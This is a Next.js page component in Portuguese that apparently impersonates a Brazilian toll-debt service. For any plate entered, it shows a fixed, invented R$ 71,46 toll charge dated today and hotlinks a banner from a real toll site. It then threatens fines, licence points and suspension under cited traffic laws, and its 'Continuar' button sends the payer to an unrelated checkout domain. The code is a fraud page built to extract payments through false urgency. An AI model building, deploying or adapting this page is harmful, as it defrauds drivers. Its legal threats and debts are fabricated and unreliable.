"use client"

import { useSearchParams, useRouter } from "next/navigation"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, Car, ChevronDown, AlertTriangle } from "lucide-react"
import { useState, useEffect } from "react"

interface VehicleData {
  MARCA: string
  MODELO: string
  ano: string
  cor: string
  municipio: string
  uf: string
  placa: string
  marcaModelo: string
}

interface DebitItem {
  id: number
  placa: string
  data: string
  empresa: string
  localizacao: string
  valor: string
}

export default function DebitosPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const placa = searchParams.get("placa") || ""
  const [currentTime, setCurrentTime] = useState("")
  const [currentDate, setCurrentDate] = useState("")
  const [vehicleData, setVehicleData] = useState<VehicleData | null>(null)

  useEffect(() => {
    const updateTime = () => {
      const now = new Date()
      const formatted = now.toLocaleString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      })
      setCurrentTime(formatted)

      const dateFormatted = now.toLocaleDateString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      })
      setCurrentDate(dateFormatted)
    }

    updateTime()
    const interval = setInterval(updateTime, 1000)

    return () => clearInterval(interval)
  }, [])

  useEffect(() => {
    const storedData = sessionStorage.getItem("vehicleData")
    if (storedData) {
      try {
        const data = JSON.parse(storedData)
        setVehicleData(data)
      } catch (error) {
        console.error("Erro ao carregar dados do veículo:", error)
      }
    }
  }, [])

  const debitItems: DebitItem[] = [
    {
      id: 1,
      placa: placa,
      data: currentDate,
      empresa: "ECOVIAS NOROESTE",
      localizacao: "Vala, Manduri, Vala, São Paulo",
      valor: "71,46",
    },
  ]

  const totalValue = "71,46"

  const handleContinue = () => {
    window.location.href = "https://checkout.escrtoriobrasil.online/VCCL1O8SCOW9"
  }

  return (
    <div className="min-h-screen bg-gray-100 pb-24">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center gap-4">
          <button
            onClick={() => router.push("/")}
            className="p-2 -ml-2 hover:bg-gray-100 rounded-lg transition-colors"
            aria-label="Voltar"
          >
            <ChevronLeft className="w-6 h-6 text-gray-900" />
          </button>
          <h1 className="text-xl font-bold text-gray-900">Débitos</h1>
        </div>
      </header>

      {/* Banner with Vehicle Info */}
      <section className="relative mb-6">
        <div className="relative h-48 overflow-hidden">
          <img
            src="https://www.pedagiodigital.com/assets/home-KlC6Y-6S.png"
            alt="Banner"
            className="w-full h-full object-cover"
          />
        </div>

        {/* Vehicle Card Overlay */}
        <div className="px-4 -mt-16 relative z-10">
          <Card className="bg-white border-0 shadow-lg p-4">
            <div className="flex items-center gap-2 mb-3">
              <Car className="w-5 h-5 text-gray-600" />
              <span className="text-sm text-gray-600 font-medium">Seus veículos:</span>
            </div>
            <div className="bg-white border border-gray-300 rounded-lg p-3">
              <div className="flex items-center justify-between mb-2">
                <p className="text-lg font-semibold text-gray-900 tracking-wide select-none">{placa}</p>
                <button className="text-gray-400 hover:text-gray-600">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="11" cy="11" r="8" />
                    <path d="m21 21-4.35-4.35" />
                  </svg>
                </button>
              </div>
              {vehicleData && (
                <div className="text-xs text-gray-600 space-y-1">
                  <p>
                    <span className="font-semibold">{vehicleData.marcaModelo}</span>
                  </p>
                  <p>
                    Ano: {vehicleData.ano} | Cor: {vehicleData.cor}
                  </p>
                  <p>
                    {vehicleData.municipio} - {vehicleData.uf}
                  </p>
                </div>
              )}
            </div>
          </Card>
        </div>
      </section>

      {/* Debits Section */}
      <section className="px-4 pb-6">
        <div className="mb-4">
          <h2 className="text-xl font-bold text-gray-900">Débitos</h2>
        </div>

        <Card className="bg-red-50 border border-red-200 p-4 mb-4">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
            <div className="flex-1">
              <h3 className="text-sm font-bold text-red-900 mb-2">ATENÇÃO: Prazo Final para Regularização</h3>
              <p className="text-xs text-red-800 leading-relaxed mb-2">
                O prazo para regularização dos débitos de pedágio <strong>vence hoje</strong>. Conforme estabelecido
                pela <strong>Lei nº 9.503/97 (Código de Trânsito Brasileiro)</strong> e{" "}
                <strong>Resolução CONTRAN nº 619/2016</strong>, a não regularização no prazo estabelecido resultará em:
              </p>
              <ul className="text-xs text-red-800 space-y-1 ml-4 list-disc">
                <li>
                  <strong>Multa de natureza grave</strong> no valor de R$ 195,23
                </li>
                <li>
                  <strong>Acréscimo de 5 pontos</strong> na Carteira Nacional de Habilitação (CNH)
                </li>
                <li>Inclusão do débito em protesto e cadastro de inadimplentes</li>
                <li>Possível suspensão do direito de dirigir em caso de reincidência</li>
              </ul>
              <p className="text-xs font-bold text-red-900 mt-3">
                Regularize agora para evitar penalidades adicionais.
              </p>
            </div>
          </div>
        </Card>

        <div className="space-y-4">
          {debitItems.map((item) => (
            <Card key={item.id} className="bg-white border-0 shadow-sm p-4">
              <div className="flex items-start gap-3">
                <Checkbox checked={true} disabled className="w-5 h-5 mt-1 flex-shrink-0" />
                <div className="flex-1 min-w-0">
                  {/* Top row: number, plate, and date */}
                  <div className="flex items-start justify-between gap-3 mb-3">
                    <div className="flex items-center gap-2 flex-shrink-0">
                      <span className="text-base text-gray-900 select-none">{item.id}</span>
                      <span className="text-base font-bold text-gray-900 select-none">{item.placa}</span>
                    </div>
                    <div className="bg-black text-white text-xs font-medium px-3 py-1.5 rounded-full select-none whitespace-nowrap">
                      {item.data}
                    </div>
                  </div>

                  {/* Company name */}
                  <p className="text-base font-bold text-gray-900 mb-2 select-none">{item.empresa}</p>

                  <div className="flex items-center justify-between gap-3 mb-2">
                    <p className="text-sm text-gray-300 select-none blur-[3px]">Vala, Manduri, Vala, São Paulo</p>
                  </div>

                  {/* Price aligned to right */}
                  <div className="flex justify-end">
                    <p className="text-lg font-bold text-gray-900 select-none">R$ {item.valor}</p>
                  </div>
                </div>
              </div>
            </Card>
          ))}
        </div>
      </section>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-lg z-50">
        <div className="px-4 py-4 flex items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <p className="text-3xl font-bold text-gray-900 select-none">{totalValue}</p>
            <ChevronDown className="w-5 h-5 text-gray-600" />
          </div>
          <Button
            size="lg"
            onClick={handleContinue}
            className="bg-black text-[#c8ff00] hover:bg-gray-900 font-semibold px-8 h-12 text-base rounded-lg"
          >
            Continuar
          </Button>
        </div>
      </div>
    </div>
  )
}
